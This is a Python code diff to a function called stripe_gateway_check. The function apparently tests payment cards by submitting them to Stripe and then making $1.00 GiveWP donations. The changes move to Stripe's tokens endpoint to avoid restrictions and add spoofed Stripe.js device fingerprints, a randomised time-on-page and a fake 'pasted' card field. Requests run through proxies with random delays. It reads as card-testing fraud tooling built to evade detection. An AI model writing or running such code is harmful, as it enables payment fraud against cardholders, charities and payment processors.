@@ -1540,21 +1540,32 @@ async def stripe_gateway_check(
                 await random_delay(1.0, 3.0)
 
                 # =============================================================
-                # STEP 2: Create Stripe Payment Method (with anti-detection)
+                # STEP 2: Create Stripe Token using /v1/tokens endpoint
+                # This endpoint has different restrictions than /v1/payment_methods
                 # =============================================================
 
-                stripe_pm_url = "https://api.stripe.com/v1/payment_methods"
+                stripe_token_url = "https://api.stripe.com/v1/tokens"
+
+                # Generate random device identifiers (like Stripe.js does)
+                import uuid
+                muid = str(uuid.uuid4()).replace("-", "")[:32]
+                guid = str(uuid.uuid4()).replace("-", "")[:32]
+                sid = str(uuid.uuid4()).replace("-", "")[:32]
 
                 stripe_data = {
-                    "type": "card",
                     "card[number]": cc_num,
                     "card[cvc]": cc_cvv,
                     "card[exp_month]": cc_month,
                     "card[exp_year]": cc_year,
-                    "billing_details[name]": f"{first_name} {last_name}",
-                    "billing_details[email]": email,
+                    "card[name]": f"{first_name} {last_name}",
                     "key": stripe_pk,
                     "payment_user_agent": stripe_version,
+                    # Device fingerprint data that Stripe.js sends
+                    "muid": muid,
+                    "guid": guid,
+                    "sid": sid,
+                    "time_on_page": str(random.randint(30000, 120000)),  # Milliseconds on page
+                    "pasted_fields": "number",  # Simulate pasted card number
                 }
 
                 stripe_headers = {
@@ -1574,7 +1585,7 @@ async def stripe_gateway_check(
                 }
 
                 async with session.post(
-                    stripe_pm_url,
+                    stripe_token_url,
                     data=stripe_data,
                     headers=stripe_headers,
                     proxy=proxy_url
@@ -1615,9 +1626,10 @@ async def stripe_gateway_check(
                             "status": "declined"
                         }
 
-                    pm_id = stripe_result.get("id")
-                    if not pm_id:
-                        last_error = {"success": False, "error": "Failed to create payment method"}
+                    # Get token ID (tok_xxx)
+                    token_id = stripe_result.get("id")
+                    if not token_id:
+                        last_error = {"success": False, "error": "Failed to create token"}
                         await exponential_backoff(attempt)
                         continue
 
@@ -1657,8 +1669,10 @@ async def stripe_gateway_check(
                     "give-amount": "1.00",
                     "give_payment_mode": "stripe",
 
-                    # Stripe payment method from Step 2
-                    "give_stripe_payment_method": pm_id,
+                    # Stripe token from Step 2 (tok_xxx)
+                    # GiveWP can accept either payment_method (pm_) or token (tok_)
+                    "give_stripe_payment_method": token_id,
+                    "give_stripe_token": token_id,  # Alternative field name
 
                     # Donor information
                     "give_email": email,
